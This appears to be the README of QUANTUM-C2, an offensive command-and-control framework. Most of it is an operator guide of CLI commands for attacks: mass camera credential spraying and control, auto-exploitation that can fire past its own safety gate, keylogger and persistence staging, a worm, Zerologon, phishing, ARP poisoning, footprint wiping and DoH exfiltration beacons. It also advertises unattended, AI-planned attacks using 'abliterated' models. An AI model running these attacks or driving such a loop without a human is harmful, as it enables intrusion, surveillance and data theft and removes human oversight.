# QUANTUM-C2

**One launcher. One engagement. Recon to sealed loot to MITRE report — with no operator in the loop.**

QUANTUM-C2 is an autonomous offensive security framework for authorized penetration tests, lab ranges, and contracted engagements. Point it at a scope and the Overlord runs the loop itself: camera-first sweep, fingerprinting, validator-gated exploitation, post-exploitation staging, harvest, AES-256-GCM sealing, MITRE mapping. `Ctrl-C` seals the loot and exits clean.

It is not a wrapper around someone else's tooling. The C2, the implant transports, the exploit catalog, the loot sealing, and the reporting layer all live in this repo and all run locally.

[![Release](https://img.shields.io/github/v/release/ProjectZeroDays/Quantum-C2?style=flat-square&color=268bee&label=release)](https://github.com/ProjectZeroDays/Quantum-C2/releases)
[![License](https://img.shields.io/badge/license-MIT-3fb950?style=flat-square)](#license)
[![Python](https://img.shields.io/badge/python-3.9%2B-3776ab?style=flat-square&logo=python&logoColor=white)](#requirements)
[![CVE catalog](https://img.shields.io/badge/catalog-3%2C372%20CVEs-8957e5?style=flat-square)](exploit_catalog)
[![Post-ex modules](https://img.shields.io/badge/post--ex-175%20modules-d29922?style=flat-square)](src/quantum/rat/modules)
[![Commits](https://img.shields.io/github/last-commit/ProjectZeroDays/Quantum-C2?style=flat-square)](https://github.com/ProjectZeroDays/Quantum-C2/commits/main)
[![Stars](https://img.shields.io/github/stars/ProjectZeroDays/Quantum-C2?style=flat-square)](https://github.com/ProjectZeroDays/Quantum-C2/stargazers)

[![CI](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/ci.yml?style=flat-square&label=ci)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/ci.yml)
[![Payloads](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/payloads.yml?style=flat-square&label=payloads)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/payloads.yml)
[![Kernel exploits](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/kernel-exploits.yml?style=flat-square&label=kernel%20exploits)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/kernel-exploits.yml)
[![Android](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/android-apk.yml?style=flat-square&label=android%20apk)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/android-apk.yml)

[![Windows](https://img.shields.io/badge/windows-exe-3fb950?style=flat-square&logo=windows&logoColor=white)](#platforms)
[![Linux](https://img.shields.io/badge/linux-supported-3fb950?style=flat-square&logo=linux&logoColor=white)](#platforms)
[![Android](https://img.shields.io/badge/android-apk-3fb950?style=flat-square&logo=android&logoColor=white)](#platforms)
[![macOS](https://img.shields.io/badge/macOS-build%20script-d29922?style=flat-square&logo=apple&logoColor=white)](#platforms)
[![iOS](https://img.shields.io/badge/iOS-target%20only-8b949e?style=flat-square&logo=apple&logoColor=white)](#platforms)
[![Packaging](https://img.shields.io/badge/deb%20%2F%20snap-not%20produced-8b949e?style=flat-square)](#platforms)

> **Authorized engagements only.** QUANTUM-C2 assumes written authorization for every network you point it at.

---

## Contents

- [What this is](#what-this-is)
- [What this is not](#what-this-is-not)
- [Platforms](#platforms)
- [Requirements](#requirements)
- [Install](#install)
- [Quick start](#quick-start)
- [Configuration](#configuration)
- [Usage](#usage)
- [Architecture](#architecture)
- [Repo layout](#repo-layout)
- [Testing](#testing)
- [Known gaps](#known-gaps)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Documentation](#documentation)
- [Release notes](#release-notes)
- [Contributing](#contributing)
- [Security policy](#security-policy)
- [Credits](#credits)
- [License](#license)

---

## What this is

An autonomous engagement loop with a real C2 underneath it, built to run unattended and leave an auditable trail.

| | |
| --- | --- |
| **Autonomous Overlord** | Unattended engagement loop with aggression postures, validator gating, and cycle caps. Runs AI-planned or fully deterministic (`--no-ai`). |
| **Production C2** | Waitress-served WSGI C2 on `:8443` with a covert kill-switch that wipes and retires every beaconing implant. |
| **DoH egress implants** | GHOSTFANG-DNS beacons ride public DoH resolvers on 443/tcp as base32 subdomain labels. No inbound ports; tasking over DNS TXT. |
| **3,372-CVE catalog** | Indexed by CVE and by vendor across 95 vendors, with a tiered registry, a fire contract, and a daily auto-update workflow. |
| **175 post-ex modules** | 14 lanes: credentials, crypto, forensics, privesc, persistence, evasion, network, radio, exfil, control, accounts, OTP, MITM, abuse. |
| **Camera warfare** | TCP and WS-Discovery discovery, vendor fingerprinting, credential spray, snapshot and PTZ control. |
| **PolyMorph v3** | Per-beacon epoch-keyed HMAC keystreams with junk filler — identical plaintexts never produce identical wire bytes. |
| **Sealed loot** | Everything sealed at rest with AES-256-GCM. The sealing key is created once and never rewritten. |
| **Listener manager** | Unique port allocation per engagement; every listener serves and receives callbacks independently. |
| **MITRE reporting** | Audit log maps to `logs/mitre_map.json` on demand. |
| **Android operator app** | On-device dashboard, tasking, and telemetry against the same API. |

### The engagement loop

```
recon → fingerprint → validator gate → exploit → stage → harvest → seal → MITRE map
```

`--aggression` controls how the loop behaves at the gate. `balanced` respects the validator; `aggressive` fires past it; `patient` waits for a stronger signal. `--cycles N` caps iterations, `0` runs until interrupted.

---

## What this is not

Read this before you file an issue.

**A Metasploit replacement, this is not.** The catalog indexes 3,372 CVEs across 95 vendors. It does not fire 3,372 exploits — catalogued means known and linked, and the set that actually runs is far smaller. Check the CVE's folder in `exploit_catalog/` for what it really is before assuming `auto` lands it.

**Not Cobalt Strike either.** There's a C2, workable transports, and a kill-switch, but no team server and no Malleable C2 profile language. Federation (`--peer <onion>`) syncs a peer's implant registry — that's shared state, not a shared live session. One operator, one box, one engagement.

**Not commercial spyware.** Pegasus-adjacent chains are here as forged stages, not as NSO's implant, and nothing is turnkey against an arbitrary handset. Delivery and per-device offsets are yours to solve.

**Not quiet.** Recon is a sweep. A default autonomous `/24` run is loud and `--aggression aggressive` is louder. If the engagement has an IDS budget, plan around it.

**Not Windows-first.** A meaningful share of modules are POSIX-only or were developed against Linux targets. Windows is covered and gets a CI leg, but the bias runs toward Linux, routers, and cameras.

**Not an AV-evasion product.** PolyMorph changes wire bytes, not on-disk signatures. No EDR bypass is guaranteed.

**Not affiliated with the real thing.** QUANTUM, FOXACID, and CAMWAR are homage to the published TAO tooling. Independent reimplementation, no shared code.

### What "verified" means here

Payload folders are **generators that self-verify structurally** — they emit honest JSON and report `vulnerable: true` only when a target-side signal was observed. Generation is not RCE confirmation; that needs the vendor's vulnerable parser and a real delivery path.

Radio zero-clicks (BlueFrag, BT HID, KRACK) produce correct frames; radio delivery is lab-side. Exactly one exploit is verified end-to-end against a live target: the ADB TLS bypass, against a mock adbd.

Everything runs locally — no telemetry, no license server, no account. But AI planning is a network call by default; `--no-ai` makes the run fully offline and deterministic.

Single maintainer, best-effort, no SLA. CI is currently red on `main`.

---

## Platforms

| Target | Status |
| --- | --- |
| Windows | **Ships** — PyInstaller EXE, verified build |
| Linux / Kali | **Ships** — primary development target |
| Android | **Ships** — APK built in CI, operator app |
| macOS | **Build script only** — `build/mac/build-dmg.sh`, no `.dmg` committed |
| iOS | **Target only** — `.ipa` needs an Apple toolchain, not produced |
| `.deb` / `.snap` | **Not produced** — scripts exist in `build/deb/`, `build/snap/` |

macOS and iOS are marked honestly rather than claimed. If you need either, the scripts are the starting point, not a download.

---

## Requirements

- Python **3.9+**
- `pip` and a virtualenv you're willing to pollute
- Optional: `nmap`, `adb`, `tor` for the commands that shell out to them
- Optional: an AI provider key for AI-planned runs (see [Configuration](#configuration))

Dependencies install from `requirements.txt`. The core set is Flask, Waitress, pycryptodome, impacket, pysmb, requests, and colorama.

---

## Install

```bash
git clone https://github.com/ProjectZeroDays/Quantum-C2
cd Quantum-C2

python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

pip install -r requirements.txt
```

For the test suite as well:

```bash
pip install -r requirements-dev.txt
```

Nothing needs root except the commands that do raw sockets or ARP work — run those with `sudo` individually rather than elevating the whole shell.

---

## Quick start

```bash
python quantum_cli.py                                  # autonomous, camera-first, local /24
python quantum_cli.py --target 203.0.113.0/24          # external scope
python quantum_cli.py --no-ai --cycles 5               # fully deterministic, no AI calls
python quantum_cli.py serve                            # C2 only, no autonomy
```

No arguments means fully autonomous. The Overlord starts the C2 on `:8443`, sweeps scope for cameras, then loops. `Ctrl-C` at any point seals the loot and exits cleanly.

`--target` with a bare IP is expanded to its `/24` and runs camera war autonomously. Add `--manual` for the step-through camera console.

---

## Configuration

Configuration is environment-driven. Copy the shape below into `.env` in the repo root; it is read at startup.

```bash
# AI planning (optional — omit entirely for QBrain deterministic mode)
ABLITERATION_KEY=your-key-here

# Pin a model instead of using adaptive selection
QCLI_PINNED_MODEL=model-id

# Force deterministic mode without passing --no-ai
QCLI_NO_AI=1
```

| Variable | Effect |
| --- | --- |
| `ABLITERATION_KEY` | Enables AI planning via Abliterated.ai. Without it, QBrain decides. |
| `QCLI_PINNED_MODEL` | Locks the AI model. Overridden by `--model`. |
| `QCLI_NO_AI` | Same as `--no-ai` — no prompts, no model downloads, no provider calls. |

Provider presets and key status are listed with `python quantum_cli.py providers`. Supported presets: abliteration, openrouter, venice, agnes, opencode.

With no key and no AI, everything still works — QBrain is a deterministic planner, not a degraded mode.

---

## Usage

`quantum_cli.py` is the single entry point and delegates to `python -m quantum`. With no command and no `--menu`, it runs the autonomous Overlord.

### Global flags

| Flag | Meaning |
| --- | --- |
| `--menu` | Open the manual console, including the camera console (`c`). |
| `--scope`, `-c <CIDR>` | Autonomous / scan scope. |
| `--target`, `-t <IP/CIDR>` | External target — autonomous camera war by default; add `--manual` for the console. |
| `--manual` | With `--target`: manual camera console instead of autonomous. |
| `--camera-only` | Restrict autonomous mode to camera operations. |
| `--no-ai` | Fully deterministic. No AI prompts, no downloads, no provider network calls. |
| `--cycles <N>` | Autonomous cycle cap. `0` is infinite. |
| `--aggression balanced\|aggressive\|patient` | Autonomous posture at the validator gate. |
| `--model <id>` | Pin the AI model. |
| `--kill` | Arm the kill-switch against a live C2 via `POST /kill`. |
| `--domain <domain>` | Operator-controlled domain for DoH egress beacons. |
| `-g`, `--gateway` | Gateway IP for QUANTUM insert. |
| `--iface` | Network interface. |
| `--peer <onion>` | Federation peer `.onion` to sync. |
| `-dc-ip`, `-dc-name`, `-d` | Domain-controller parameters for `zerologon`. |
| `-f`, `--file` | Input file for `pcap`. |
| `--force` | Force exploitation past the validator gate. |

### C2 and network

```bash
python quantum_cli.py serve                            # production WSGI C2 on :8443
python quantum_cli.py federation                       # start federation service -> {"onion": ...}
python quantum_cli.py federation --peer <peer-onion>   # merge a peer's implant registry
python quantum_cli.py posixagent                       # generate the POSIX agent; -t to pin host
python quantum_cli.py ghostdns --domain ops.example.tld  # DoH egress agent + task check
python quantum_cli.py listener deploy                  # allocate a listener on 9100-9999
python quantum_cli.py listener active                  # list active listeners
python quantum_cli.py listener hits                    # show callback hits
python quantum_cli.py listener stopall                 # tear down every listener
```

### Camera warfare

```bash
python quantum_cli.py camwar -c 10.0.0.0/24    # discover, attack, control every camera in scope
python quantum_cli.py camshot -t 10.0.0.42     # one-shot: identify, attack, snapshot
python quantum_cli.py cams -c 10.0.0.0/24      # verbose step-through variant
```

### Recon and probing

```bash
python quantum_cli.py zerocheck -t 10.0.0.42   # 9-probe battery: log4shell, citrixbleed, citrix path,
                                               #   PAN-OS, Confluence OGNL, WebLogic, IOS XE, vCenter, MOVEit
python quantum_cli.py recon -t 10.0.0.42       # fingerprint
python quantum_cli.py osint -t example.com     # OSINT lookup
python quantum_cli.py validator -t 10.0.0.42   # target-value scoring, the exploit gate
```

### Exploitation

```bash
python quantum_cli.py auto -t 10.0.0.42        # validator-gated auto-exploit; --force skips the gate
python quantum_cli.py brute -t 10.0.0.42       # credential spray
python quantum_cli.py routerexploit -t 10.0.0.42  # router CVE set
python quantum_cli.py phish -t user@example.com   # phish engine
```

### Implant and post-exploit

```bash
python quantum_cli.py keylog                   # stage the keylogger, delivered on next beacon
python quantum_cli.py persist                  # stage persistence (PERSISTX)
python quantum_cli.py wipe                     # footprint wipe, per host OS
python quantum_cli.py seal                     # seal all loot (GRAYFISH)
python quantum_cli.py unseal                   # unseal all loot
python quantum_cli.py harvest                  # pull staged artifacts
```

### Techniques

```bash
python quantum_cli.py mshtmaldoc               # build the MSHTML maldoc (CVE-2021-40444)
python quantum_cli.py flashfill                # FlashFill staged-fill technique
python quantum_cli.py cagebreak                # escape the macOS sandbox cage
python quantum_cli.py macreset                 # generate the macOS recovery-reset script
python quantum_cli.py emoji                    # EMOJISMS: encode a message, verify decode
python quantum_cli.py cottonmouth -t 10.0.0.42 # payload staging
python quantum_cli.py worm -t 10.0.0.42        # GODSUPREME worm hop
python quantum_cli.py zerologon -dc-ip 10.0.0.1 -dc-name DC01 -d CORP.LOCAL
```

### AI, OPSEC, reporting

```bash
python quantum_cli.py deployai                 # deploy the local AI model into models/
python quantum_cli.py keygen                   # regenerate implant crypto keys; --force overwrites
python quantum_cli.py mitre                    # regenerate logs/mitre_map.json from the audit log
python quantum_cli.py tor                      # ensure Tor is up
python quantum_cli.py p0feed                   # Project Zero feed: latest posts and candidates
```

### Operator suite

```bash
python quantum_cli.py providers                # list provider presets + key status
python quantum_cli.py agents                   # list/create/edit agent presets
python quantum_cli.py skills                   # list/seed skill packs, compose prompts
python quantum_cli.py workflows                # list/create/run workflows
python quantum_cli.py --menu                   # manual console, everything above
```

### Remaining direct commands

| Command | Purpose |
| --- | --- |
| `foxacid` | FOXACID watering-hole server on `:8081`. |
| `quantum -t <ip> -g <gw>` | QUANTUM insert — ARP poison and inject. |
| `dohc2` | DoH C2 beacon server on `:5353`. |
| `icmp` | Switchboard ICMP covert-channel listener, 20 s. |
| `trinity` | Trinity memory capture. |
| `wifi` | Somberknight wireless sweep. |
| `triage` | Wildfire triage. |
| `mfp` | MFP persistence. |
| `pcap -f <file>` | PCAP analysis. |
| `episcribe [-t <sel>]` | EpiScribe watch, 300 s. |

---

## Architecture

Two planes, deliberately separate.

**Control plane** — `src/quantum/c2/`. A Flask app served by Waitress on `:8443` (gunicorn fallback, Flask dev server as last resort). Holds the implant registry, task lifecycle, event bus, telemetry store, and the dashboard API. `POST /kill` wipes and retires every beaconing implant.

**Operator plane** — `src/quantum/overlord/`. The decision loop. Consumes recon output, scores targets through the validator, selects from the weapon registry, and drives the post-exploitation lanes. `--no-ai` swaps the AI supervisor for QBrain, a deterministic policy.

Everything crossing between them lands in `logs/audit.jsonl`, which is the sole input to `mitre_map.json`. Loot never leaves the target unsealed — GRAYFISH wraps each artifact in AES-256-GCM before it is written, and `logs/.lootkey` is created once and never rewritten.

Implant transports are interchangeable: HTTPS beacon, GHOSTFANG-DNS over DoH, or the ICMP switchboard. PolyMorph v3 sits under all of them, rekeying per epoch so identical plaintexts differ on the wire.

---

## Repo layout

```
quantum-cli/
├── quantum_cli.py                # single-entry launcher (delegates to src/quantum)
├── src/quantum/                  # the package
│   ├── core/                     # env/paths, audit log + MITRE mapper, opsec, GRAYFISH, QBrain
│   ├── ai/                       # AI_Supervisor + local model bootstrap
│   ├── recon/                    # scan, fingerprint/Validator, OSINT, DoH, WS-Discovery/ONVIF
│   ├── camwar/                   # CAMWAR engine, vendor tables, RTSP, brute/phish
│   ├── weapons/                  # tiered CVE registry, kernel/remote/media/legacy/bluetooth/adb,
│   │                             #   PolyMorph, techniques
│   ├── rat/modules/              # 175 post-ex modules across 14 lanes (lane_A … lane_N)
│   ├── postexploit/              # persistx, kitlogger, killswitch, harvest, footprint
│   ├── c2/                       # Flask app + routes, Waitress WSGI, transports, agents
│   ├── overlord/                 # AutonomousOverlord, decide policy, engagement engines
│   ├── control/                  # SQLite registry, loot FTS5 index, device diff snapshots
│   └── dash/                     # live ops dashboard, served at /dash
├── exploit_catalog/              # 3,372 CVEs — by_cve/ and by_vendor/
├── exploit_payloads/             # per-CVE deploy folders (deploy.py + README + WhitePaper each)
├── android/                      # operator app source, APK build outputs
├── agents/build/variant.py       # deterministic per-target OBSIDIAN variant builder
├── qcli/                         # runtime: keys/, obsidian.ps1, ghostfang.sh, ghostdns.sh
├── logs/                         # audit.jsonl, decisions.jsonl, mitre_map.json, .lootkey
├── loot/                         # sealed loot (*.gfy)
├── models/                       # local AI models
├── docs/                         # WIKI, OPERATOR_MANUAL, TROUBLESHOOTING, HOWTOs, audits
├── release/                      # versioned release artifacts
└── tests/                        # pytest suite
```

`dist/` holds the archived single-file V3.1 build and the Windows binary. `single-script/` holds legacy single-file reference copies.

---

## Testing

```bash
pytest tests/
```

The suite covers the weapon registry fire contract, PolyMorph round-trips and epoch/junk diversification, the EMOJISMS codec, variant-builder determinism, the 14 zero-click generation battery, the 13 perimeter closed-port battery, and the folder-registry resolve contract.

Two census gates run in CI and fail the build: `scripts/placeholder_census.py` rejects `NotImplementedError`, bare `...` bodies, `pass`-only functions, and self-declared simulated literals; `scripts/endpoint_census.py` rejects any outbound host not in the endpoint manifest. Together they enforce the rule the project is built on — no shipped module may claim a capability it did not verify.

CI runs on Linux and Windows across Python 3.9, 3.11, and 3.13. The Android leg is CI-only; local Gradle builds are parked.

---

## Known gaps

Tracked openly rather than papered over.

- **Android local builds are broken.** Gradle jar failure; APKs come from CI only.
- **macOS, iOS, `.deb`, and `.snap` produce no artifact.** Scripts exist, nothing is committed.
- **CI is red on `main`.** Last push failed. Treat `main` as moving.
- **Per-device offsets are null by design** in several kernel and baseband payloads. Resolve with `resolve_offsets.py` against the actual device.
- **Radio zero-click delivery is lab-side.** Frames are correct; you supply the radio.
- **Catalog breadth outruns weaponization.** 3,372 catalogued, far fewer runnable.

---

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| Port 8443 already bound | `python quantum_cli.py serve --port 8444`, or kill the stale process |
| `--no-ai` still makes network calls | Check `QCLI_NO_AI` isn't unset elsewhere; confirm with `providers` |
| No cameras found | Confirm you're on the same L2 segment; WS-Discovery is multicast and does not cross routers |
| Loot unreadable after a run | `python quantum_cli.py unseal` — the key at `logs/.lootkey` is required and is never regenerated |
| `keygen --force` destroyed a live engagement | Expected. Keys are per-install; re-stage agents after regenerating |
| Implants stop beaconing | Check the kill-switch didn't fire, then `listener active` |
| Permission errors on raw sockets | Run that one command under `sudo`, not the whole shell |

More in [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).

---

## FAQ

**Does it need internet?** No. `--no-ai` runs fully offline. Only AI-planned runs and catalog auto-update touch the network.

**Does it phone home?** Not to any Venice/Quantum server. AI provider calls go to the provider you configure.

**Can I run it against a client's network?** With written authorization, yes — that's the design target. Get the scope in writing and pin it with `--scope`.

**Why is the CVE count so much larger than the runnable set?** The catalog indexes everything known and links each entry. Weaponization is manual and slower by nature.

**Where does loot go?** `loot/`, sealed as `.gfy`. Unseal with the CLI; the key is at `logs/.lootkey`.

**Is there a GUI?** A web dashboard at `/dash` and the Android app. No desktop GUI.

**Why does a payload report `vulnerable: false` on a box I know is vulnerable?** Generation succeeded but no target-side signal was observed. Confirm with the vendor's parser and a real delivery path.

---

## Documentation

- [docs/WIKI.md](docs/WIKI.md) — architecture, module map, MITRE mapping, REST API
- [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) — runbook
- [docs/HOWTOs.md](docs/HOWTOs.md) — autonomous runs, DoH exfil, variants, registry
- [docs/ZERO_CLICK_AUDIT.md](docs/ZERO_CLICK_AUDIT.md) — payload audit and honesty boundaries
- [docs/SLDR_AGENT_PROMPT.md](docs/SLDR_AGENT_PROMPT.md) — agent doctrine and presets
- [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) — symptom to fix
- [OPERATOR_SURFACE.md](OPERATOR_SURFACE.md) — every CLI command and flag
- [POWERSHELL_SYNTAX.md](POWERSHELL_SYNTAX.md) — PowerShell payload conventions

---

## Release notes

Current: **v4.6.5** — Exploit-Index integration (3,372 CVEs), RAT/C2 dashboard, 175 post-ex modules.

- [RELEASE_NOTES_v4.6.4.md](RELEASE_NOTES_v4.6.4.md)
- [RELEASE_NOTES_v4.6.3.md](RELEASE_NOTES_v4.6.3.md)
- [RELEASE_NOTES_v4.6.2.md](RELEASE_NOTES_v4.6.2.md)

Older status and progress files live alongside them: `FINAL_*.md`, `PROGRESS_RELEASE.md`, `RELEASE_STATUS.md`. Move these to `docs/releases/` when you next touch the tree.

---

## Contributing

1. Fork, branch, and keep the change narrow.
2. `ruff check .` and `pytest tests/` must pass locally.
3. New modules must clear both census gates — no placeholders, no invented endpoints.
4. If you add a payload, it needs `deploy.py`, `README.md`, `WhitePaper.md`, a self-verification path, and a registry entry.
5. Update `payloads.lock.json` if you touch a payload — CI compares it.
6. Keep output byte-reproducible: LF line endings, `create_system = 0`, uncompressed zip entries.

Divergence between `quantum_cli.py` and the package is a bug, not a feature. `quantum_cli.py` is the spec.

---

## Security policy

QUANTUM-C2 is offensive tooling, so treat its own dependencies as attack surface.

- Report vulnerabilities in the framework privately via GitHub Security Advisories rather than a public issue.
- Include a reproduction and the affected version tag.
- The framework makes no guarantee about the safety of third-party exploit code it ships; read a payload before firing it at anything you care about.
- Loot keys are plaintext at `logs/.lootkey`. Back them up; losing the file loses the loot.

---

## Credits

Built and maintained by [ProjectZeroDays](https://github.com/ProjectZeroDays).

The CVE catalog is seeded from [SecureWithUmer/Exploit-Index](https://github.com/SecureWithUmer/Exploit-Index) and updated daily from public sources including the CISA KEV feed, Exploit-DB, and PayloadsAllTheThings. Naming throughout is homage to published TAO tooling. Individual CVE researchers are credited in each payload's `WhitePaper.md`.

---

## License

MIT. See the header in [`quantum_cli.py`](quantum_cli.py).

```
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## Links

- Repository: [github.com/ProjectZeroDays](https://github.com/ProjectZeroDays)
- Releases: [github.com/ProjectZeroDays/Quantum-C2/releases](https://github.com/ProjectZeroDays/Quantum-C2/releases)
- Issues: [github.com/ProjectZeroDays/Quantum-C2/issues](https://github.com/ProjectZeroDays/Quantum-C2/issues)
